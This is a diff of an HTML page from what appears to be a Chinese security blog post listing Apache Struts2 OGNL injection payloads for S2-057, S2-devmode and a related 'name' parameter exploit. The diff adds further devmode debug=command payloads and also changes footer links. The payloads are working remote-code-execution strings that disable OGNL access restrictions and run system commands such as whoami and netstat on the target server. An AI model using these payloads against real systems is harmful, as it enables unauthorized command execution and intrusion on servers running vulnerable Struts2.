@@ -188,7 +188,7 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=%25%7b(%23dm%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS).(%23_memberAccess%3f(%23_memberAccess%3d%23dm)%3a((%23container%3d%23context%5b%27com.opensymphony.xwork2.ActionContext.container%27%5d).(%23ognlUtil%3d%23container.getInstance(%40com.opensymphony.xwork2.ognl.OgnlUtil%40class)).(%23ognlUtil.getExcludedPackageNames().clear()).(%23ognlUtil.getExcludedClasses().clear()).(%23context.setMemberAccess(%23dm)))).(%23cmd%3d%27netstat+-an%27).(%23iswin%3d(%40java.lang.System%40getProperty(%27os.name%27).toLowerCase().contains(%27win%27))).(%23cmds%3d(%23iswin%3f%7b%27cmd.exe%27%2c%27%2fc%27%2c%23cmd%7d%3a%7b%27%2fbin%2fbash%27%2c%27-c%27%2c%23cmd%7d)).(%23p%3dnew+java.lang.ProcessBuilder(%23cmds)).(%23p.redirectErrorStream(true)).(%23process%3d%23p.start()).(%40org.apache.commons.io.IOUtils%40toString(%23process.getInputStream()))%7d</span><br></pre></td></tr></table></figure>
 <h3 id="S2-057"><a href="#S2-057" class="headerlink" title="S2-057"></a>S2-057</h3><p>URL<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">检测</span><br><span class="line">/$%7B233*233%7D/actionChain1.action</span><br><span class="line"></span><br><span class="line">2.3.20 版本</span><br><span class="line">/%24%7B%28%23_memberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23w%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27whoami%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D/index.action</span><br><span class="line"></span><br><span class="line">2.3.34 版本</span><br><span class="line">/%24%7B%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23w%3D%23ct.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27whoami%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D/index.action</span><br></pre></td></tr></table></figure></p>
 <h3 id="S2-devmode"><a href="#S2-devmode" class="headerlink" title="S2-devmode"></a>S2-devmode</h3><p>GET</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?debug=browser&amp;object=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context%5B%23parameters.rpsobj%5B0%5D%5D.getWriter().println(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command%5B0%5D).getInputStream()))):sb.toString.json&amp;rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;command=netstat%20-an</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">?debug=browser&amp;object=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context%5B%23parameters.rpsobj%5B0%5D%5D.getWriter().println(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command%5B0%5D).getInputStream()))):sb.toString.json&amp;rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;command=netstat%20-an</span><br><span class="line"></span><br><span class="line">debug=command&amp;expression=%28%23parameters%29</span><br><span class="line"></span><br><span class="line">debug=command&amp;expression=%28%23application%29</span><br><span class="line"></span><br><span class="line">debug=command&amp;expression=(%23wr%3D%23context%5B%23parameters.obj%5B0%5D%5D.getWriter())!%3D(%23wr.println(%23parameters.content%5B0%5D))!%3D(%23wr.flush())!%3D(%23wr.close())&amp;obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;content=7f604dbaced33b7d9c2d5e1212eba16e</span><br></pre></td></tr></table></figure>
 <p>​    </p>
 
     </div>
@@ -232,6 +232,10 @@
         <ul>
             
             <li>
+                <a class="footer-post" href="/blog/1597283762460.html">URLDNS 反序列化</a>
+            </li>
+            
+            <li>
                 <a class="footer-post" href="/blog/1577679142463.html">CVE-2019-17571</a>
             </li>
             
@@ -241,10 +245,6 @@
             
             <li>
                 <a class="footer-post" href="/blog/1573541964775.html">hydra问题</a>
-            </li>
-            
-            <li>
-                <a class="footer-post" href="/blog/1561960885122.html">XXE漏洞</a>
             </li>
             
         </ul>
@@ -258,6 +258,10 @@
     <ul>
         
         <li>
+            <a class="footer-post" href="/categories/学习/">学习</a>
+        </li>
+        
+        <li>
             <a class="footer-post" href="/categories/系统环境/">系统环境</a>
         </li>
         
@@ -266,11 +270,7 @@
         </li>
         
         <li>
-            <a class="footer-post" href="/categories/编程记录/">编程记录</a>
-        </li>
-        
-        <li>
-            <a class="footer-post" href="/categories/工具/">工具</a>
+            <a class="footer-post" href="/categories/日常姿势/">日常姿势</a>
         </li>
         
     </ul>
